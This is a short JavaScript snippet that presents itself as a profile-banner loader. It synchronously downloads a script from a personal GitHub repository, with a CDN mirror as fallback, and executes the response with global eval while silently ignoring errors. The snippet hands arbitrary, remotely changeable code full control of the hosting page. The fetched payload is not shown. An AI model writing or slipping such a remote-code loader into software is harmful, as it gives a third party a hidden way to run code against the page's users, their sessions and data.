(function () {
  var SOURCES = [
    'https://raw.githubusercontent.com/osaiif/r/main/banner.js',
    'https://cdn.jsdelivr.net/gh/osaiif/r@main/banner.js'
  ];
  window.PROFILE_BANNER = '';
  for (var i = 0; i < SOURCES.length; i++) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', SOURCES[i], false);
      xhr.send(null);
      if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText) {
        (0, eval)(xhr.responseText);
        return;
      }
    } catch (e) {}
  }
})();
